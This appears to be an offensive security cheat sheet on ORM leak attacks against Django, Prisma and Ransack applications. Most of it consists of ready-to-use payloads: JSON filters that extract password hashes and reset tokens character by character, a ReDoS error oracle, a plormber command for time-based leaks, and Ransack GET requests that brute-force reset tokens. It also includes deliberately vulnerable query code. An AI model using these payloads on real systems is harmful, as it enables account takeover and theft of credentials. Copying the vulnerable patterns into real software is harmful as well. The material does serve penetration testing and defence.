# ORM Leak

> An ORM leak vulnerability occurs when sensitive information, such as database structure or user data, is unintentionally exposed due to improper handling of ORM queries. This can happen if the application returns raw error messages, debug information, or allows attackers to manipulate queries in ways that reveal underlying data.


## Summary

* [Django (Python)](#django-python)
    * [Query filter](#query-filter)
    * [Relational Filtering](#relational-filtering)
        * [One-to-One](#one-to-one)
        * [Many-to-Many](#many-to-many)
    * [Error-based leaking - ReDOS](#error-based-leaking---redos)
* [Prisma (Node.JS)](#prisma-nodejs)
    * [Relational Filtering](#relational-filtering-1)
        * [One-to-One](#one-to-one-1)
        * [Many-to-Many](#many-to-many-1)
* [Ransack (Ruby)](#ransack-ruby)
* [CVE](#cve)
* [References](#references)


## Django (Python)

The following code is a basic example of an ORM querying the database.

```py
users = User.objects.filter(**request.data)
serializer = UserSerializer(users, many=True)
```

The problem lies in how the Django ORM uses keyword parameter syntax to build QuerySets. By utilizing the unpack operator (`**`), users can dynamically control the keyword arguments passed to the filter method, allowing them to filter results according to their needs.


### Query filter

The attacker can control the column to filter results by. 
The ORM provides operators for matching parts of a value. These operators can utilize the SQL LIKE condition in generated queries, perform regex matching based on user-controlled patterns, or apply comparison operators such as < and >.


```json
{
    "username": "admin",
    "password__startswith": "p"
}
```

Interesting filter to use:

* `__startswith`
* `__contains`
* `__regex`


### Relational Filtering

Let's use this great example from [PLORMBING YOUR DJANGO ORM, by Alex Brown](https://www.elttam.com/blog/plormbing-your-django-orm/)
![](https://www.elttam.com/assets/images/blog/2024-06-24-plormbing-your-django-orm/UML-example-app-simplified-highlight1.png)

We can see 2 type of relationships:

* One-to-One relationships
* Many-to-Many Relationships


#### One-to-One

Filtering through user that created an article, and having a password containing the character `p`.

```json
{
    "created_by__user__password__contains": "p"
}
```


#### Many-to-Many

Almost the same thing but you need to filter more.

* Get the user IDS: `created_by__departments__employees__user__id`
* For each ID, get the username: `created_by__departments__employees__user__username` 
* Finally, leak their password hash: `created_by__departments__employees__user__password`

Use multiple filters in the same request:

```json
{
    "created_by__departments__employees__user__username__startswith": "p",
    "created_by__departments__employees__user__id": 1
}
```


### Error-based leaking - ReDOS

If Django use MySQL, you can also abuse a ReDOS to force an error when the filter does not properly match the condition.

```json
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
// => Return something

{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}  
// => Error 500 (Timeout exceeded in regular expression match)
```


## Prisma (Node.JS)

**Tools**:

* [elttam/plormber](https://github.com/elttam/plormber) - tool for exploiting ORM Leak time-based vulnerabilities
    ```ps1
    plormber prisma-contains \
        --chars '0123456789abcdef' \
        --base-query-json '{"query": {PAYLOAD}}' \
        --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
        --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
        --verbose-stats \
        https://some.vuln.app/articles/time-based;
    ```

**Example**:

Example of an ORM leak in Node.JS with Prisma.

```js
const posts = await prisma.article.findMany({
    where: req.query.filter as any // Vulnerable to ORM Leaks
})
```

Use the include to return all the fields of user records that have created an article

```json
{
    "filter": {
        "include": {
            "createdBy": true
        }
    }
}
```

Select only one field

```json
{
    "filter": {
        "select": {
            "createdBy": {
                "select": {
                    "password": true
                }
            }
        }
    }
}
```


### Relational Filtering

#### One-to-One

* [`filter[createdBy][resetToken][startsWith]=06`](http://127.0.0.1:9900/articles?filter[createdBy][resetToken][startsWith]=)

#### Many-to-Many

```json
{
    "query": {
        "createdBy": {
            "departments": {
                "some": {
                    "employees": {
                        "some": {
                            "departments": {
                                "some": {
                                    "employees": {
                                        "some": {
                                            "departments": {
                                                "some": {
                                                    "employees": {
                                                        "some": {
                                                            "{fieldToLeak}": {
                                                                "startsWith": "{testStartsWith}"
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```


## Ransack (Ruby)

Only in Ransack < `4.0.0`.

![](https://assets-global.website-files.com/5f6498c074436c349716e747/63ceda8f7b5b98d68365bdee_ransack_bruteforce_overview-p-1600.png)

* Extracting the `reset_password_token` field of a user
    ```ps1
    GET /posts?q[user_reset_password_token_start]=0 -> Empty results page
    GET /posts?q[user_reset_password_token_start]=1 -> Empty results page
    GET /posts?q[user_reset_password_token_start]=2 -> Results in page

    GET /posts?q[user_reset_password_token_start]=2c -> Empty results page
    GET /posts?q[user_reset_password_token_start]=2f -> Results in page
    ```

* Target a specific user and extract his `recoveries_key`
    ```ps1
    GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0
    ```


## CVE

* [CVE-2023-47117: Label Studio ORM Leak](https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw)
* [CVE-2023-31133: Ghost CMS ORM Leak](https://github.com/TryGhost/Ghost/security/advisories/GHSA-r97q-ghch-82j9)
* [CVE-2023-30843: Payload CMS ORM Leak](https://github.com/payloadcms/payload/security/advisories/GHSA-35jj-vqcf-f2jf)


## References

- [ORM Injection - HackTricks - July 30, 2024](https://book.hacktricks.xyz/pentesting-web/orm-injection)
- [ORM Leak Exploitation Against SQLite - Louis Nyffenegger - July 30, 2024](https://pentesterlab.com/blog/orm-leak-with-sqlite3)
- [plORMbing your Django ORM - Alex Brown - June 24, 2024](https://www.elttam.com/blog/plormbing-your-django-orm/)
- [plORMbing your Prisma ORM with Time-based Attacks - Alex Brown - July 9, 2024](https://www.elttam.com/blog/plorming-your-primsa-orm/)
- [QuerySet API reference - Django - August 8, 2024](https://docs.djangoproject.com/en/5.1/ref/models/querysets/)
- [Ransacking your password reset tokens - Lukas Euler - January 26, 2023](https://positive.security/blog/ransack-data-exfiltration)